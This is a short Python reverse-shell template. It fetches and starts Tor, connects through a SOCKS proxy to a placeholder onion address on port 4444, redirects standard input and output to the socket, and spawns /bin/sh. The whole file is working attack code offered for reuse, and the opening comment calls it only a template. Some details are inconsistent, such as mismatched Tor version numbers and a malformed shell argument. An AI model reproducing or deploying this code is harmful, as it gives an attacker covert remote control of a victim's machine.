#this file never actually being used as a payload just a template
import socket
import os
import socks
import urllib
import subprocess
from time import sleep

#constents
OnionUrl = "" #your onion url hidden service
PORT = 4444 #the port...

def DownloadTor():
        os.system("wget https://www.torproject.org/dist/torbrowser/7.0.2/tor-browser-linux64-7.0.2_en-US.tar.xz")
        os.system("tar -xf tor-browser-linux64-7.0.1_en-US.tar.xz")
        os.system("tor-browser_en-US/Browser/TorBrowser/Tor/tor")

DownloadTor()
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
s = socks.socksocket()
s.connect((OnionUrl, PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","i"]);



